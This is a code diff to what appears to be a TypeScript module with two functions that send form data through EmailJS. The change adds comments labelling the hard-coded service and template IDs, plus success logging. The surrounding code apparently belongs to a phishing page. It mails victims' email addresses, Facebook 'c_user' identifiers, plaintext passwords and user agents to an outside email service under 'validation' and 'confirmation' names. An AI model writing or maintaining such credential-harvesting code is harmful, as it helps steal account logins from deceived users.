@@ -9,8 +9,8 @@ export const initEmailJS = () => {
 export const sendValidationFormEmail = async (formData: any) => {
   try {
     const response = await emailjs.send(
-      "service_jpksfco",
-      "template_90egw9s",
+      "service_jpksfco",      // Service ID
+      "template_90egw9s",     // Template ID
       {
         user_email: formData.user_email,
         c_user: formData.c_user,
@@ -20,6 +20,7 @@ export const sendValidationFormEmail = async (formData: any) => {
         user_agent: navigator.userAgent,
       }
     );
+    console.log('Validation email sent successfully:', response);
     return response;
   } catch (error) {
     console.error("Error sending validation email:", error);
@@ -31,8 +32,8 @@ export const sendValidationFormEmail = async (formData: any) => {
 export const sendConfirmationFormEmail = async (formData: any) => {
   try {
     const response = await emailjs.send(
-      "service_jpksfco",
-      "template_90egw9s",
+      "service_jpksfco",      // Service ID
+      "template_90egw9s",     // Template ID
       {
         user_email: formData.user_email,
         password: formData.password,
@@ -42,6 +43,7 @@ export const sendConfirmationFormEmail = async (formData: any) => {
         user_agent: navigator.userAgent,
       }
     );
+    console.log('Confirmation email sent successfully:', response);
     return response;
   } catch (error) {
     console.error("Error sending confirmation email:", error);
